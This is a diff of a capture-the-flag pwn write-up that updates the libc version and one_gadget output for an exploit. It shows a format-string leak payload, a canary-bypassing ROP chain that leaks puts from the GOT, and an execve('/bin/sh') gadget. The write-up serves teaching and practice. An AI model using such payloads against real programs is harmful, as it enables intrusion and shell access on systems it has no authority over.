@@ -230,15 +230,16 @@ first_payload = "%23$llx%20$llx"
 second_payload = "A"*72 + p64(canary) + p64(0x0) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
 ```
 
-With leaked puts libc address we can get the libc of the program using libc-database which was `libc6_2.23-0ubuntu11.2_amd64.so`  
+With leaked puts libc address we can get the libc of the program using libc-database which was `libc6_2.31-0ubuntu9.7_amd64.so`  
 Then we use `one_gadget`:
 
 ```console
 ┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf]
-└─$ one_gadget libc6_2.23-0ubuntu11.2_amd64.so
-0x45226 execve("/bin/sh", rsp+0x30, environ)
+└─$ one_gadget libc6_2.31-0ubuntu9.7_amd64.so  
+0xe3b2e execve("/bin/sh", r15, r12)
 constraints:
-  rax == NULL
+  [r15] == NULL || r15 == NULL
+  [r12] == NULL || r12 == NULL
 ```
 
 Now we have everything to build our final payload  
